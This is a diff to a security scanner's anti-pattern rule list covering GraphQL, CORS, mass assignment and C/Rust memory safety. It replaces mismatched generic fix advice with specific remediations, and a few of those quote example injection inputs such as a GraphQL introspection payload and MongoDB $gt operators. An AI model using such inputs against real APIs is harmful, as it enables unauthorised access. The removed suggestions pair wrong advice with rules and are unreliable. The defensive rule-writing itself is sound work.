@@ -25268,7 +25268,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "GraphQL introspection enabled in production exposes schema to attackers",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: GraphQL introspection enabled in production exposes schema to attackers. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "GraphQL introspection in production reveals your entire schema — types, fields, mutations, arguments. Attackers map every endpoint without guessing. Disable: if (process.env.NODE_ENV === 'production') { schema = makeExecutableSchema({ introspection: false }) }. Use schema registries for authorized consumers."
             ),
     },
     {
@@ -25277,7 +25277,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "CORS wildcard origin allows any domain to make cross-origin requests",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Missing or misconfigured security header. Essential headers: Content-Security-Policy (XSS prevention), Strict-Transport-Security (HTTPS enforcement), X-Content-Type-Options: nosniff (MIME sniffing prevention), X-Frame-Options: DENY (clickjacking). Set headers on every response, including error responses."
+                "CORS origin: '*' lets any website make API requests. For public APIs without credentials: acceptable. For authenticated APIs: set specific origins: cors({ origin: ['https://app.example.com'] }). Use a function for dynamic validation against a database of allowed origins."
             ),
     },
     {
@@ -25286,7 +25286,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Mass assignment from request body without allowlisting fields enables property injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: Mass assignment from request body without allowlisting fields enables property injection. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "User.create(req.body) passes ALL request fields to the database — an attacker sends { role: 'admin', verified: true }. Allowlist fields: const { name, email } = req.body; User.create({ name, email }). In Rails: params.require(:user).permit(:name, :email)."
             ),
     },
     {
@@ -25295,7 +25295,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Direct use of user-supplied ID in database lookup without ownership check (IDOR risk)",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Direct use of user-supplied ID in database lookup without ownership check (IDOR risk). Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "Order.findById(req.params.id) returns any order, not just the user's. Add ownership check: Order.findOne({ _id: req.params.id, userId: req.user.id }). IDOR (Insecure Direct Object Reference) is OWASP #1 — always verify the requesting user owns the resource."
             ),
     },
     {
@@ -25304,7 +25304,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Rate limiting explicitly disabled exposes API to brute force and DoS attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: Rate limiting explicitly disabled exposes API to brute force and DoS attacks. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "Disabling rate limiting (rateLimit: false, limiter.skip = true) allows unlimited requests. Brute force login in seconds, API abuse, and DoS. Use tiered limits: 100 req/min for authenticated, 20 req/min for unauthenticated. Use redis-based limiter for distributed systems."
             ),
     },
     {
@@ -25313,7 +25313,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "GraphQL query built via string interpolation enables injection attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Template literal interpolation in SQL passes user input directly into the query string. Use parameterized queries: db.query('SELECT * FROM users WHERE id = $1', [userId]). For Knex: .whereRaw('col = ?', [value]). For Sequelize: use model methods or Sequelize.literal() with validated input, never template strings."
+                "query = `{ user(id: '${input}') { name } }` injects into GraphQL. An attacker sends: ') { __schema { types { name } } } #. Use variables: client.query({ query: USER_QUERY, variables: { id: input } }). GraphQL variables are type-checked and never interpolated into the query string."
             ),
     },
     {
@@ -25322,7 +25322,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "GraphQL resolver marked as public without authentication guard on mutation or query",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "Public GraphQL resolvers for mutations (createUser, deletePost, transferFunds) allow unauthenticated data modification. Add auth guards: @UseGuards(AuthGuard) in NestJS, context.user check in Apollo, or directive-based auth: @auth(requires: USER) in the schema."
             ),
     },
     {
@@ -25331,7 +25331,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "GraphQL query depth limit set excessively high allows deeply nested denial-of-service queries",
         "severity": Severity.WARN,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "GraphQL depth limit of 100+ allows queries like { user { posts { comments { author { posts { ... } } } } } } causing exponential database joins. Set depthLimit(5) or depthLimit(10) via graphql-depth-limit. Most legitimate queries need depth 3-5."
             ),
     },
     {
@@ -25340,7 +25340,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "GraphQL query complexity analysis disabled allows resource-exhaustion attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "Without query complexity analysis, a single query can request thousands of objects: { users(first: 10000) { posts { comments } } }. Use graphql-query-complexity: set maxComplexity: 1000 and assign costs per field. Paginated fields should have higher cost multipliers."
             ),
     },
     {
@@ -25349,7 +25349,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Sensitive field exposed through API serialization decorator without exclusion",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: Sensitive field exposed through API serialization decorator without exclusion. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "Serializer exposing password_hash, internal_id, or secret fields. Exclude: class UserSerializer: class Meta: exclude = ['password_hash', 'internal_notes']. Or use allowlist: fields = ['id', 'name', 'email']. Allowlisting is safer — new fields default to hidden."
             ),
     },
     {
@@ -25358,7 +25358,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Entire database object returned in API response may leak sensitive internal fields",
         "severity": Severity.WARN,
             "suggestion": (
-                "Resource leak — opened resources (files, connections, sockets) not closed on all code paths. Use context managers: with open(path) as f: (Python), try-with-resources (Java), defer conn.Close() (Go). For async: use async with and ensure cleanup in finally blocks. Resources must be closed even when exceptions occur."
+                "Returning the entire database object (res.json(user)) leaks: password hashes, internal IDs, timestamps, soft-delete flags. Create a DTO/view: return { id: user.id, name: user.name, email: user.email }. Use serialization libraries (class-transformer, marshmallow) for consistent field control."
             ),
     },
     {
@@ -25367,7 +25367,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "API key accepted via query parameter exposes it in server logs and browser history",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "API key in ?api_key=xxx appears in: server access logs, browser history, Referer headers, proxy logs, CDN logs. Send via header: Authorization: Bearer <key> or X-API-Key: <key>. If query param is required (webhooks): use short-lived tokens with narrow scope."
             ),
     },
     {
@@ -25376,7 +25376,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Batched mutations enabled without per-operation authorization check",
         "severity": Severity.WARN,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "Batched GraphQL mutations [{ createOrder }, { transferFunds }, { deleteUser }] should check authorization per operation, not per batch. In the batch resolver: verify permissions for EACH mutation individually. A batch is not a single authorization unit."
             ),
     },
     {
@@ -25385,7 +25385,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Blindly trusting X-Forwarded-For header enables IP spoofing to bypass rate limits",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Missing or misconfigured security header. Essential headers: Content-Security-Policy (XSS prevention), Strict-Transport-Security (HTTPS enforcement), X-Content-Type-Options: nosniff (MIME sniffing prevention), X-Frame-Options: DENY (clickjacking). Set headers on every response, including error responses."
+                "X-Forwarded-For is trivially spoofed: curl -H 'X-Forwarded-For: 1.2.3.4'. For rate limiting: use the connection's remote address (req.socket.remoteAddress). If behind a trusted proxy: configure trust proxy depth (app.set('trust proxy', 1)) so only your load balancer's X-Forwarded-For is trusted."
             ),
     },
     {
@@ -25394,7 +25394,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Wildcard scope or permission grants unrestricted access to all resources",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Follow the principle of least privilege: grant only the minimum permissions required for the operation. Validate authorization on every request, not just authentication. Use role-based access control (RBAC) with specific permissions per role."
+                "Wildcard scope (scope: '*' or permission: 'all') bypasses all authorization checks. Define granular scopes: 'read:users', 'write:orders', 'admin:billing'. Each API endpoint should require specific scopes, never accept wildcards. Audit scope usage quarterly."
             ),
     },
     {
@@ -25403,7 +25403,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "API endpoint without pagination allows unbounded data retrieval causing memory exhaustion",
         "severity": Severity.WARN,
             "suggestion": (
-                "Memory safety issue. Ensure: all allocations have corresponding frees, all pointers are checked for null before dereference, all arrays have bounds checks, and all resources are released in error paths. Use static analysis tools (Valgrind, AddressSanitizer) to detect."
+                "API endpoint returning all records without pagination exhausts server memory and enables data scraping. Add pagination: ?page=1&limit=20 with a maximum limit (100). Use cursor-based pagination for large datasets: ?cursor=abc&limit=20. Always enforce a default limit."
             ),
     },
     {
@@ -25412,7 +25412,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Spread operator on request body in database write enables mass assignment",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: Spread operator on request body in database write enables mass assignment. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "Object.assign(dbRecord, req.body) or { ...dbRecord, ...req.body } overwrites any field including role, permissions, verified. Destructure only allowed fields: const { name, email } = req.body; Object.assign(dbRecord, { name, email })."
             ),
     },
     {
@@ -25421,7 +25421,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Content Security Policy disabled in Helmet middleware removes XSS protection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Cross-site scripting (XSS) via unsanitized user input in HTML context. Sanitize output based on context: HTML body: escape <>&\'' characters. HTML attributes: quote and escape. JavaScript: JSON.stringify(). URL: encodeURIComponent(). Use DOMPurify for HTML, or framework auto-escaping (React JSX, Vue templates)."
+                "Disabling Helmet's CSP removes the Content-Security-Policy header which prevents XSS. Set: app.use(helmet({ contentSecurityPolicy: { directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] } } })). Even a basic CSP blocks inline script injection."
             ),
     },
     {
@@ -25430,7 +25430,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Sensitive field included in Swagger API documentation via ApiProperty decorator",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Sensitive field included in Swagger API documentation via ApiProperty decorator. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "Sensitive fields (password, secret, internal_id) exposed in Swagger via @ApiProperty() appear in the public API documentation. Use @ApiHideProperty() on sensitive fields, or create separate DTOs for request/response that exclude internal fields."
             ),
     },
     {
@@ -25439,7 +25439,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "GraphQL __typename introspection fragment used in production query may leak schema details",
         "severity": Severity.INFO,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "__typename in production queries reveals type names from your schema. While less damaging than full introspection, it aids reconnaissance. Strip __typename from production responses with a plugin, or accept the risk if your schema is intentionally public."
             ),
     },
     {
@@ -25448,7 +25448,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "GraphQL subscription without authentication allows unauthorized real-time data access",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Cross-site scripting (XSS) via unsanitized user input in HTML context. Sanitize output based on context: HTML body: escape <>&\'' characters. HTML attributes: quote and escape. JavaScript: JSON.stringify(). URL: encodeURIComponent(). Use DOMPurify for HTML, or framework auto-escaping (React JSX, Vue templates)."
+                "GraphQL subscriptions without auth allow unauthorized real-time data streams. Validate the connection: onConnect: (connectionParams) => { const user = verifyToken(connectionParams.authToken); if (!user) throw new Error('Unauthorized'); return { user }; }."
             ),
     },
     {
@@ -25457,7 +25457,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "CORS credentials with wildcard origin is a browser-rejected but server-side misconfiguration",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "credentials: true with origin: '*' is rejected by browsers, but the server-side misconfiguration indicates intent to allow cross-origin credentials. If you need credentials: specify exact origins. If you don't: remove credentials: true."
             ),
     },
     {
@@ -25466,7 +25466,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Administrative or internal API endpoint configured without authentication",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "Admin/internal endpoints without auth are accessible to anyone who discovers the URL. Add authentication middleware AND authorization check: router.use('/admin', authenticate, requireRole('admin')). Internal APIs should also require service-to-service auth tokens."
             ),
     },
     {
@@ -25475,7 +25475,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Passing raw request parameters as database filter criteria enables NoSQL injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "db.find({ where: req.query }) passes raw query params as MongoDB/Sequelize filters. An attacker sends ?role=admin or ?$gt=0. Validate and allowlist: const { name } = req.query; db.find({ where: { name } }). For MongoDB: reject any key starting with $."
             ),
     },
     {
@@ -25484,7 +25484,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "File upload size limit set too high or disabled enables denial-of-service via large uploads",
         "severity": Severity.WARN,
             "suggestion": (
-                "File upload without validation allows arbitrary file types and path manipulation. Validate: file extension against an allowlist, MIME type (check magic bytes, not just header), file size limit. Store with generated filenames (uuid4), never user-provided names. Serve uploaded files from a separate domain/CDN to prevent XSS."
+                "Upload limit of 100MB+ or no limit enables DoS via large file uploads. Set: multer({ limits: { fileSize: 5 * 1024 * 1024 } }) for 5MB. Validate content-type, reject unexpected MIME types, and use streaming upload to avoid buffering entire files in memory."
             ),
     },
     {
@@ -25493,7 +25493,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "CORS middleware used with default open configuration allows all cross-origin requests",
         "severity": Severity.WARN,
             "suggestion": (
-                "Missing or misconfigured security header. Essential headers: Content-Security-Policy (XSS prevention), Strict-Transport-Security (HTTPS enforcement), X-Content-Type-Options: nosniff (MIME sniffing prevention), X-Frame-Options: DENY (clickjacking). Set headers on every response, including error responses."
+                "Default CORS middleware (cors()) with no options allows all origins. Configure explicitly: cors({ origin: 'https://app.example.com', methods: ['GET', 'POST'], allowedHeaders: ['Content-Type', 'Authorization'] })."
             ),
     },
     {
@@ -25502,7 +25502,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Destructive or administrative operation decorated to skip authentication",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "@SkipAuth or @AllowAnonymous on delete/update/admin endpoints bypasses security. Remove the skip decorator. If public access is genuinely needed: add rate limiting, input validation, and audit logging to compensate for the missing auth."
             ),
     },
     {
@@ -25511,7 +25511,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Idempotency or replay protection disabled on financial or state-changing endpoint",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Idempotency or replay protection disabled on financial or state-changing endpoint. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "Financial endpoints without idempotency keys process duplicate requests (network retries, double-clicks) as separate transactions. Require an Idempotency-Key header: store in Redis with 24h TTL, return cached response on duplicate. Stripe uses this pattern."
             ),
     },
     {
@@ -25520,7 +25520,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "SQL or GraphQL union/join operation constructed with string interpolation enables injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Template literal interpolation in SQL passes user input directly into the query string. Use parameterized queries: db.query('SELECT * FROM users WHERE id = $1', [userId]). For Knex: .whereRaw('col = ?', [value]). For Sequelize: use model methods or Sequelize.literal() with validated input, never template strings."
+                "UNION or JOIN with interpolated strings: `SELECT ... UNION ${userQuery}` allows arbitrary query injection. UNION injection can extract data from any table. Use parameterized queries only — UNION clauses should never contain user input."
             ),
     },
     {
@@ -25529,7 +25529,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "X-Powered-By header reveals server technology stack aiding reconnaissance attacks",
         "severity": Severity.INFO,
             "suggestion": (
-                "Excessive or insecure logging practice detected. Use structured logging with appropriate levels: ERROR for failures, WARNING for recoverable issues, INFO for business events, DEBUG for development only. Never log: passwords, tokens, credit cards, or full request/response bodies."
+                "X-Powered-By: Express reveals your framework, helping attackers target known vulnerabilities. Disable: app.disable('x-powered-by') or use Helmet which removes it automatically. Same for Server: nginx — set server_tokens off in nginx config."
             ),
     },
     {
@@ -25538,7 +25538,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Use of gets() is always unsafe as it performs no bounds checking on input buffer",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "gets() reads unlimited input into a fixed buffer — it was removed from C11 because it CANNOT be used safely. Replace with fgets(buf, sizeof(buf), stdin) which enforces the buffer limit. There is no safe way to use gets()."
             ),
         "file_types": [".c", ".cpp", ".h", ".hpp"],
     },
@@ -25548,7 +25548,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "sprintf with %s format has no length limit; use snprintf to prevent buffer overflow",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection via string interpolation. The database driver sees the user's input as SQL code, not data. Use parameterized queries: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,)). The %s placeholder is never interpreted as SQL — the driver sends it as a bound parameter. This applies to all SQL variants: %s (psycopg2), ? (sqlite3), $1 (asyncpg)."
+                "sprintf(buf, '%s', input) writes unlimited bytes. Use snprintf(buf, sizeof(buf), '%s', input) which truncates at buf size. Check return value: if (written >= sizeof(buf)) the output was truncated. Always use snprintf, never sprintf."
             ),
     },
     {
@@ -25557,7 +25557,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "strcpy performs no bounds checking; use strncpy or strlcpy to prevent buffer overflow",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "strcpy(dst, src) copies until null byte with no size check. Use strncpy(dst, src, sizeof(dst) - 1); dst[sizeof(dst) - 1] = '\0'; — strncpy doesn't null-terminate if src >= n. Or use strlcpy(dst, src, sizeof(dst)) where available (BSD/macOS)."
             ),
     },
     {
@@ -25566,7 +25566,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "strcat performs no bounds checking; use strncat or strlcat to prevent buffer overflow",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "strcat(dst, src) appends with no size check — if dst + src exceeds buffer, stack/heap corruption occurs. Use strncat(dst, src, sizeof(dst) - strlen(dst) - 1). Or use strlcat(dst, src, sizeof(dst)) which is safer and returns total length needed."
             ),
     },
     {
@@ -25575,7 +25575,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Potential double-free detected: same pointer freed twice without nullification",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Memory safety issue. Ensure: all allocations have corresponding frees, all pointers are checked for null before dereference, all arrays have bounds checks, and all resources are released in error paths. Use static analysis tools (Valgrind, AddressSanitizer) to detect."
+                "free(ptr); ... free(ptr); corrupts the heap allocator metadata. After free: ptr = NULL; The second free(NULL) is a no-op. In C++: use smart pointers (unique_ptr, shared_ptr) which free exactly once. Double-free enables exploitation via heap feng shui."
             ),
     },
     {
@@ -25584,7 +25584,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Use-after-free: pointer dereferenced after being freed without reassignment",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Memory safety issue. Ensure: all allocations have corresponding frees, all pointers are checked for null before dereference, all arrays have bounds checks, and all resources are released in error paths. Use static analysis tools (Valgrind, AddressSanitizer) to detect."
+                "free(ptr); ptr->field; reads deallocated memory — could crash or return attacker-controlled data if the memory was reallocated. After free: set ptr = NULL and check before use. Use AddressSanitizer (-fsanitize=address) to detect use-after-free in testing."
             ),
     },
     {
@@ -25593,7 +25593,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Raw pointer dereference inside unsafe block in Rust requires careful lifetime management",
         "severity": Severity.WARN,
             "suggestion": (
-                "Concurrency issue — unsynchronized access to shared mutable state. For databases: use transactions. For in-memory: use threading.Lock() (Python), sync.Mutex (Go), or synchronized/ReentrantLock (Java). For distributed systems: use Redis SETNX or database advisory locks for distributed locking."
+                "unsafe { *raw_ptr } in Rust dereferences without borrow checker protection. Ensure: the pointer is valid (non-null, properly aligned), the pointed-to memory is initialized, and no other reference exists. Minimize unsafe blocks — wrap in a safe API with documented invariants."
             ),
     },
     {
@@ -25602,7 +25602,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "malloc return value not checked for NULL; memory allocation failure will cause null dereference",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Memory safety issue. Ensure: all allocations have corresponding frees, all pointers are checked for null before dereference, all arrays have bounds checks, and all resources are released in error paths. Use static analysis tools (Valgrind, AddressSanitizer) to detect."
+                "ptr = malloc(size); if (!ptr) { /* handle OOM */ }. Without the NULL check, subsequent ptr->field segfaults. For critical allocations: log and exit. For optional allocations: return error to caller. In C++: new throws std::bad_alloc by default — use nothrow if you want NULL."
             ),
     },
     {
@@ -25611,7 +25611,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "realloc on same pointer without storing in temp variable causes memory leak if realloc fails",
         "severity": Severity.WARN,
             "suggestion": (
-                "Resource leak — opened resources (files, connections, sockets) not closed on all code paths. Use context managers: with open(path) as f: (Python), try-with-resources (Java), defer conn.Close() (Go). For async: use async with and ensure cleanup in finally blocks. Resources must be closed even when exceptions occur."
+                "ptr = realloc(ptr, new_size); — if realloc fails, ptr is NULL but the original memory is leaked (lost the old pointer). Use: tmp = realloc(ptr, new_size); if (tmp) { ptr = tmp; } else { /* handle failure, ptr still valid */ }."
             ),
     },
     {
@@ -25620,7 +25620,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "alloca allocates on stack without bounds checking; large allocations cause stack overflow",
         "severity": Severity.WARN,
             "suggestion": (
-                "Buffer overflow risk — writing beyond allocated bounds enables code execution. Use bounds-checked functions: strncpy instead of strcpy, snprintf instead of sprintf. In modern languages: use slices with length checks, avoid unsafe pointer arithmetic. Enable compiler protections: -fstack-protector-strong, ASLR, and DEP."
+                "alloca(user_size) allocates on the stack with no overflow protection. A large size crashes the process or enables stack smashing. Use malloc/calloc for variable-size allocations. Stack allocation is only safe for known-small fixed sizes."
             ),
     },
     {
@@ -25629,7 +25629,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "scanf with %s has no field width limit; use %Ns with explicit width to prevent overflow",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Buffer overflow risk — writing beyond allocated bounds enables code execution. Use bounds-checked functions: strncpy instead of strcpy, snprintf instead of sprintf. In modern languages: use slices with length checks, avoid unsafe pointer arithmetic. Enable compiler protections: -fstack-protector-strong, ASLR, and DEP."
+                "scanf('%s', buf) reads unlimited input. Use scanf('%255s', buf) for a 256-byte buffer (255 chars + null). Better: use fgets(buf, sizeof(buf), stdin) then sscanf for parsing. Always specify field width in scanf format strings."
             ),
     },
     {
@@ -25638,7 +25638,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "memcpy using sizeof pointer instead of sizeof pointed-to structure copies wrong bytes",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: memcpy using sizeof pointer instead of sizeof pointed-to structure copies wrong bytes. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "memcpy(dst, src, sizeof(src)) where src is a pointer copies sizeof(void*) (4 or 8 bytes), not the struct size. Use sizeof(*src) or sizeof(struct MyStruct). This is a common bug when refactoring from stack to heap allocation."
             ),
     },
     {
@@ -25647,7 +25647,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "atoi has no error handling for invalid input; use strtol with error checking instead",
         "severity": Severity.WARN,
             "suggestion": (
-                "Error handling issue. Catch specific exceptions, log with context (operation, input, error), and either recover or propagate. Never return None/null to signal errors — use exceptions or Result types. Ensure error messages don't leak internal details to end users."
+                "atoi('abc') returns 0 with no way to distinguish from atoi('0'). Use: long val = strtol(str, &endptr, 10); if (endptr == str || *endptr != '\0') { /* invalid */ }. strtol also detects overflow via errno == ERANGE."
             ),
     },
     {
@@ -25656,7 +25656,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "std::mem::transmute in unsafe block reinterprets bits without type safety checks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Concurrency issue — unsynchronized access to shared mutable state. For databases: use transactions. For in-memory: use threading.Lock() (Python), sync.Mutex (Go), or synchronized/ReentrantLock (Java). For distributed systems: use Redis SETNX or database advisory locks for distributed locking."
+                "transmute reinterprets the raw bits — transmute::<u32, f32>(0x3f800000) works but transmute::<&str, u64> is UB. Prefer: from/into conversions, as casts for numeric types, or std::mem::transmute_copy with explicit size verification. Each transmute needs a safety comment."
             ),
     },
     {
@@ -25665,7 +25665,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Static mutable variable in Rust creates data race conditions across threads",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Race condition — concurrent access to shared state without synchronization can cause data corruption, double-spending, or privilege escalation. Use: database transactions with appropriate isolation level (SERIALIZABLE for critical operations), optimistic locking (version column + compare-and-swap), or mutex/lock for in-memory state."
+                "static mut COUNTER: i32 = 0; creates a data race when accessed from multiple threads. Use: static COUNTER: AtomicI32 = AtomicI32::new(0); with COUNTER.fetch_add(1, Ordering::SeqCst). For complex types: use std::sync::Mutex<T> or once_cell::sync::Lazy."
             ),
     },
     {
@@ -25674,7 +25674,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Casting slice reference to raw pointer may outlive the borrowed data causing dangling pointer",
         "severity": Severity.WARN,
             "suggestion": (
-                "Type safety violation. Avoid type coercion (== in JS, implicit casts), use strict comparison (=== in JS, isinstance() in Python). Add type annotations and validate at boundaries with Pydantic (Python), Zod (TypeScript), or similar validation libraries."
+                "let ptr: *const T = &slice[0]; — if the slice is dropped or reallocated, ptr is dangling. Pin the data or ensure the slice outlives the pointer. Use slice.as_ptr() and keep the slice alive. In FFI: pass length alongside pointer."
             ),
     },
     {
@@ -25683,7 +25683,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "no_mangle FFI function should validate all pointer arguments for null before dereferencing",
         "severity": Severity.WARN,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "#[no_mangle] extern 'C' fn process(ptr: *const Data) — FFI pointers may be null even if your Rust code never passes null. Add: if ptr.is_null() { return ERROR_NULL_PTR; }. Document the null-safety contract in the function's safety section."
             ),
     },
     {
@@ -25692,7 +25692,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Array allocated with new[] must be freed with delete[]; mismatch causes undefined behavior",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Memory safety issue. Ensure: all allocations have corresponding frees, all pointers are checked for null before dereference, all arrays have bounds checks, and all resources are released in error paths. Use static analysis tools (Valgrind, AddressSanitizer) to detect."
+                "new int[10] must be freed with delete[], not delete. delete (without []) only calls destructor for the first element and corrupts the heap. In modern C++: use std::vector<int>(10) or std::array<int, 10> — no manual delete needed."
             ),
     },
     {
@@ -25701,7 +25701,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
